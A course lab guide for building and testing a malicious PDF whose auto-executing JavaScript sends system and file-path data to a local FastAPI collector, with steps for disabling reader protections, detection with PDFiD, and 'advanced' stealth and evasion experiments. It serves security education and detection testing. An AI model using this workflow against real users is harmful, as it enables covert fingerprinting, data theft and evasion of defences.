# Malicious PDF Testing Guide
**Educational Security Research - Safe Testing Procedures**

---

## Overview

This guide provides step-by-step instructions for safely testing the malicious PDF in a controlled environment for your computer security course.

## Table of Contents

1. [Prerequisites](#prerequisites)
2. [Environment Setup](#environment-setup)
3. [Testing Procedure](#testing-procedure)
4. [Expected Results](#expected-results)
5. [Analysis](#analysis)
6. [Cleanup](#cleanup)
7. [Troubleshooting](#troubleshooting)
8. [Safety Guidelines](#safety-guidelines)

---

## Prerequisites

### Required Software

```bash
# Install Python dependencies
pip install fastapi uvicorn reportlab pypdf2

# Or use requirements.txt
pip install -r requirements.txt
```

### Create requirements.txt

```
fastapi>=0.104.0
uvicorn>=0.24.0
reportlab>=4.0.0
pypdf2>=3.0.0
```

### PDF Readers for Testing

**Vulnerable versions (for educational testing):**
- Adobe Acrobat Reader DC (versions before 2023 updates)
- Foxit Reader (with JavaScript enabled)
- PDF-XChange Viewer

**Note:** Modern PDF readers have significant security protections. You may need to:
- Use older versions in a VM
- Manually enable JavaScript
- Disable protected/sandboxed mode

---

## Environment Setup

### Option 1: Local Testing (Simplest)

Test everything on the same machine.

**Advantages:**
- Quick setup
- No network configuration
- Good for initial testing

**Network URL:** `http://localhost:8000/collect`

### Option 2: Network Testing (More Realistic)

Test across different machines on your network.

**Setup:**
1. Find your server's IP address:
   ```bash
   # Linux/Mac
   ip addr show | grep inet
   # or
   ifconfig | grep inet

   # Windows
   ipconfig
   ```

2. Ensure firewall allows port 8000:
   ```bash
   # Linux (UFW)
   sudo ufw allow 8000/tcp

   # Linux (firewalld)
   sudo firewall-cmd --add-port=8000/tcp --permanent
   sudo firewall-cmd --reload
   ```

**Network URL:** `http://YOUR_IP:8000/collect` (e.g., `http://192.168.1.100:8000/collect`)

### Option 3: Virtual Machine (Most Secure)

Test in an isolated virtual machine.

**Setup:**
1. Create VM with:
   - Windows 7/10 or Linux
   - Older PDF reader installed
   - Network configured (NAT or Bridged)

2. Host machine runs FastAPI collector
3. VM opens the malicious PDF

**Advantages:**
- Complete isolation
- Safe testing environment
- Can snapshot/restore VM
- Realistic attack simulation

---

## Testing Procedure

### Step 1: Start the Collector Server

On the server machine:

```bash
cd /home/serpiko/Projects/unir/seguridad

# Start the FastAPI server
python fastapi_collector.py
```

**Expected output:**
```
======================================================================
PDF Exfiltration Collector Server
======================================================================

Starting FastAPI server...

Endpoints:
  - http://localhost:8000/
  - http://localhost:8000/collect (GET - main endpoint)
  - http://localhost:8000/collect-post (POST)
  - http://localhost:8000/submit (Form submission)
  - http://localhost:8000/data (View collected data)
  - http://localhost:8000/stats (View statistics)

For external access, use your IP address instead of localhost
Example: http://192.168.1.100:8000/collect

Press CTRL+C to stop

======================================================================
INFO:     Started server process
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://0.0.0.0:8000
```

### Step 2: Verify Server is Running

Open a browser and visit: `http://localhost:8000`

You should see:
```json
{
  "service": "PDF Exfiltration Collector",
  "status": "running",
  "purpose": "Educational security research",
  "endpoints": {
    "/collect": "Receives exfiltrated data via GET (query params)",
    "/collect-post": "Receives exfiltrated data via POST (JSON body)",
    "/data": "View all collected data",
    "/stats": "View statistics"
  }
}
```

### Step 3: Generate Malicious PDF

In a new terminal:

```bash
cd /home/serpiko/Projects/unir/seguridad

# Basic version
python create_malicious_pdf.py --url http://localhost:8000/collect

# Or if testing from another machine
python create_malicious_pdf.py --url http://192.168.1.100:8000/collect

# Advanced version with stealth techniques
python create_malicious_pdf.py --url http://localhost:8000/collect --advanced

# Custom filename
python create_malicious_pdf.py --url http://localhost:8000/collect -o test_malware.pdf
```

**Expected output:**
```
[*] Creating malicious PDF: malicious_document.pdf
[*] Exfiltration URL: http://localhost:8000/collect
[+] Creating base PDF document...
[+] Creating JavaScript payload...
[+] Embedding JavaScript in PDF...
[+] Writing malicious PDF to disk...
[+] Malicious PDF created successfully: malicious_document.pdf

======================================================================
PDF Information:
======================================================================
Filename: malicious_document.pdf
Exfiltration URL: http://localhost:8000/collect
Payload: JavaScript with multiple exfiltration methods
Trigger: Auto-execute on document open (OpenAction)

Data collected:
  - PDF Reader version and type
  - Operating system platform
  - System language
  - Screen resolution
  - Timezone information
  - Document metadata
  - File path (if accessible)

======================================================================
```

### Step 4: Test the PDF

1. **Prepare PDF reader:**
   - Enable JavaScript (usually in Preferences/Settings)
   - Disable Protected Mode (if present)
   - Disable Enhanced Security

   **Adobe Acrobat Settings:**
   ```
   Edit → Preferences → JavaScript
   ☑ Enable Acrobat JavaScript

   Edit → Preferences → Security (Enhanced)
   ☐ Enable Protected Mode at startup (UNCHECK)
   ☐ Enable Enhanced Security (UNCHECK)
   ```

2. **Open the PDF:**
   - Double-click `malicious_document.pdf`
   - Or: Right-click → Open With → Adobe Acrobat

3. **Watch for indicators:**
   - May see security warning (click "Allow")
   - May see brief flash/loading
   - Document should display normally

### Step 5: Check Collected Data

**Method 1: Web Browser**
```
Navigate to: http://localhost:8000/data
```

**Method 2: Command Line**
```bash
curl http://localhost:8000/data | python -m json.tool
```

**Method 3: Check Logs**
```bash
# View server terminal output
# Or check log file:
cat pdf_exfiltration.log
```

**Method 4: View Statistics**
```
Navigate to: http://localhost:8000/stats
```

---

## Expected Results

### Successful Exfiltration

If the attack works, you should see data similar to:

```json
{
  "total_entries": 1,
  "data": [
    {
      "timestamp": "2024-12-03T14:23:45.123456",
      "method": "GET",
      "client_ip": "127.0.0.1",
      "user_agent": "Mozilla/5.0...",
      "collected_data": {
        "reader": "Reader",
        "viewer_version": "23.001.20093",
        "platform": "WIN",
        "language": "ENU",
        "doc_title": "Security Report 2024",
        "doc_author": "Security Team",
        "doc_filename": "malicious_document.pdf",
        "doc_path": "C:/Users/username/Downloads/malicious_document.pdf",
        "num_pages": "1",
        "screen_width": "1920",
        "screen_height": "1080",
        "timezone_offset": "-300",
        "timestamp": "2024-12-03T14:23:45.000Z"
      },
      "headers": {
        "host": "localhost:8000",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)...",
        "accept": "*/*"
      }
    }
  ]
}
```

### Server Logs

The collector server will log:

```
2024-12-03 14:23:45 - INFO - Data collected via GET from 127.0.0.1
2024-12-03 14:23:45 - INFO - Parameters: {
  "reader": "Reader",
  "viewer_version": "23.001.20093",
  "platform": "WIN",
  "language": "ENU",
  ...
}
```

### Saved Files

Data is also saved to:
- `pdf_exfiltration.log` - Server logs
- `collected_data.json` - JSON dump of all collected data

---

## Analysis

### What Was Collected?

Analyze the collected data to understand the information leak:

1. **Reader Information:**
   - `viewer_version`: Identifies vulnerable software version
   - `reader`: Type of PDF reader
   - Useful for: Targeting specific exploits

2. **System Information:**
   - `platform`: Operating system (WIN, Mac, UNIX)
   - `language`: System language
   - Useful for: OS-specific attacks, localized phishing

3. **User Context:**
   - `doc_path`: File location reveals username, directory structure
   - `doc_filename`: Shows how user named/saved the file
   - Useful for: Understanding user behavior, file system layout

4. **Display Information:**
   - `screen_width`, `screen_height`: Screen resolution
   - Useful for: Browser exploit sizing, UI manipulation

5. **Temporal Information:**
   - `timezone_offset`: Geographical indicator
   - `timestamp`: When document was opened
   - Useful for: Social engineering timing, user profiling

### Network Traffic Analysis

Capture and analyze the exfiltration request:

```bash
# Start packet capture
sudo tcpdump -i any -w capture.pcap port 8000

# Open PDF, then stop capture
# Analyze with Wireshark or:
tcpdump -r capture.pcap -A
```

**Look for:**
- HTTP GET request with query parameters
- Unencrypted data transmission
- User-agent strings
- Timing of request

### Comparison with Detection Tools

Run the PDF through analysis tools:

```bash
# Analyze with PDFiD
pdfid malicious_document.pdf

# Expected output showing:
# /JavaScript 1
# /JS 1
# /OpenAction 1 (or /AA)
```

```bash
# Extract JavaScript
pdf-parser.py -s javascript malicious_document.pdf > extracted_js.txt
cat extracted_js.txt
```

---

## Cleanup

After testing:

1. **Stop the server:**
   ```bash
   # Press CTRL+C in the server terminal
   ```

2. **Clear collected data:**
   ```bash
   curl -X DELETE http://localhost:8000/data
   ```

3. **Delete generated files (optional):**
   ```bash
   rm malicious_document.pdf
   rm pdf_exfiltration.log
   rm collected_data.json
   ```

4. **Reset PDF reader security settings:**
   - Re-enable Protected Mode
   - Re-enable Enhanced Security
   - Review JavaScript settings

5. **If using VM:**
   - Restore to clean snapshot
   - Or delete VM if no longer needed

---

## Troubleshooting

### No Data Received

**Issue:** PDF opens but no data appears in collector

**Solutions:**

1. **Check JavaScript is enabled:**
   ```
   Adobe: Edit → Preferences → JavaScript → Enable Acrobat JavaScript
   Foxit: File → Preferences → JavaScript → Enable JavaScript
   ```

2. **Check Protected Mode is disabled:**
   ```
   Adobe: Edit → Preferences → Security (Enhanced) → Disable Protected Mode
   ```

3. **Check URL in PDF:**
   ```bash
   # Extract and verify the embedded URL
   strings malicious_document.pdf | grep -E "http://|https://"
   ```

4. **Test URL manually:**
   ```bash
   curl "http://localhost:8000/collect?test=manual"
   # Check if data appears at /data endpoint
   ```

5. **Check firewall:**
   ```bash
   # Ensure port 8000 is accessible
   netstat -an | grep 8000
   ```

6. **Try older PDF reader:**
   - Modern readers block most JavaScript
   - Try Adobe Reader DC 2017 or earlier
   - Try Foxit Reader (older versions)

### Server Not Starting

**Issue:** FastAPI server won't start

**Solutions:**

1. **Check if port is in use:**
   ```bash
   # Linux/Mac
   lsof -i :8000

   # Windows
   netstat -ano | findstr :8000
   ```

2. **Use different port:**
   ```python
   # Edit fastapi_collector.py
   uvicorn.run(app, host="0.0.0.0", port=8080)  # Change port
   ```

3. **Check dependencies:**
   ```bash
   pip install --upgrade fastapi uvicorn
   ```

### PDF Generation Fails

**Issue:** Script fails to create PDF

**Solutions:**

1. **Check dependencies:**
   ```bash
   pip install --upgrade reportlab pypdf2
   ```

2. **Check permissions:**
   ```bash
   ls -la .
   # Ensure you have write permission in current directory
   ```

3. **Try different output path:**
   ```bash
   python create_malicious_pdf.py --url http://localhost:8000/collect -o /tmp/test.pdf
   ```

### Modern PDF Readers Block Everything

**Issue:** All modern PDF readers block the JavaScript

**Reality Check:**
- This is actually good security!
- Modern Adobe Reader, Foxit, Chrome PDF viewer all block this
- Shows effectiveness of current security controls

**Options:**

1. **Document the blocking:**
   - Take screenshots of security warnings
   - Include in your report as "successful mitigation"

2. **Use VM with older software:**
   - Windows 7 with Adobe Reader DC 2015
   - Demonstrates historical vulnerability

3. **Focus on the educational aspect:**
   - The code demonstrates the technique
   - The blocking shows defense effectiveness
   - Both are valuable for your course

---

## Safety Guidelines

### ⚠️ Critical Safety Rules

1. **NEVER use on unauthorized systems**
   - Only test on your own machines
   - Only test in controlled environments
   - Get written permission for any network testing

2. **NEVER distribute malicious PDFs**
   - Don't email to others
   - Don't upload to public shares
   - Keep in controlled directory

3. **NEVER use real credentials**
   - Don't collect actual passwords
   - Don't target real users
   - Use only for demonstration

4. **ALWAYS use isolated environments**
   - VMs are ideal
   - Separate network if possible
   - Clean up after testing

5. **ALWAYS label files clearly**
   - Mark as "MALWARE" or "TEST"
   - Don't use deceptive names in your own lab
   - Document what each file does

### Legal and Ethical Considerations

**This is legal when:**
- Used for educational coursework
- Tested only on your own systems
- Part of authorized security research
- Properly documented and controlled

**This becomes illegal when:**
- Used against others without permission
- Distributed with malicious intent
- Used to actually steal data
- Used outside academic context

### Responsible Disclosure

If you discover a new vulnerability:
1. Do NOT publicize it immediately
2. Report to vendor (Adobe, Foxit, etc.)
3. Allow time for patching (90 days standard)
4. Then publish educational content

---

## Documentation for Your Course

### What to Include in Your Report

1. **Methodology:**
   - How you created the PDF
   - What data was collected
   - How exfiltration worked

2. **Results:**
   - Screenshots of collector receiving data
   - Analysis of collected information
   - Network traffic captures

3. **Detection:**
   - How PDFiD identified the threat
   - What security warnings appeared
   - How modern readers blocked it

4. **Mitigation:**
   - Settings that prevent the attack
   - Best practices for users
   - Organizational controls

5. **Lessons Learned:**
   - Effectiveness of current defenses
   - Remaining vulnerabilities
   - Importance of keeping software updated

### Sample Screenshots to Capture

1. Server running and waiting for connections
2. PDF being opened in reader
3. Security warnings (if any)
4. Data appearing in `/data` endpoint
5. Browser showing collected information
6. PDFiD analysis output
7. Wireshark capture of exfiltration request

---

## Advanced Experiments

### Experiment 1: Stealth Techniques

Test the advanced version with anti-sandbox:

```bash
python create_malicious_pdf.py --url http://localhost:8000/collect --advanced
```

Compare detection rates between basic and advanced versions.

### Experiment 2: Different Readers

Test across multiple PDF readers:
- Adobe Acrobat Reader DC
- Foxit Reader
- PDF-XChange
- Chrome built-in viewer
- Firefox built-in viewer

Document which readers block the attack.

### Experiment 3: Network Monitoring

Set up complete network monitoring:

```bash
# Terminal 1: Packet capture
sudo tcpdump -i any -w capture.pcap

# Terminal 2: Server
python fastapi_collector.py

# Terminal 3: Open PDF
# Then analyze capture
wireshark capture.pcap
```

### Experiment 4: Modified Payloads

Modify the JavaScript to collect different data:
- Clipboard contents (if accessible)
- Recent file list
- Printer information
- Installed fonts (fingerprinting)

### Experiment 5: Detection Evasion

Try various evasion techniques:
- Encrypted JavaScript strings
- Time-delayed execution
- Environment checks
- Obfuscated code

Document what works and what doesn't.

---

## Conclusion

This testing framework allows you to safely:
- Understand PDF-based attacks
- Test detection mechanisms
- Evaluate security controls
- Document for academic purposes

Remember:
- Always work in isolated environments
- Never target unauthorized systems
- Focus on education and defense
- Document everything for your course

---

## References

- Adobe PDF Specification: https://www.adobe.com/devnet/pdf/pdf_reference.html
- OWASP Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- Didier Stevens' PDF Tools: https://blog.didierstevens.com/programs/pdf-tools/

---

**Document Version:** 1.0
**Last Updated:** 2024-12-03
**For:** Computer Security Course - Educational Use Only
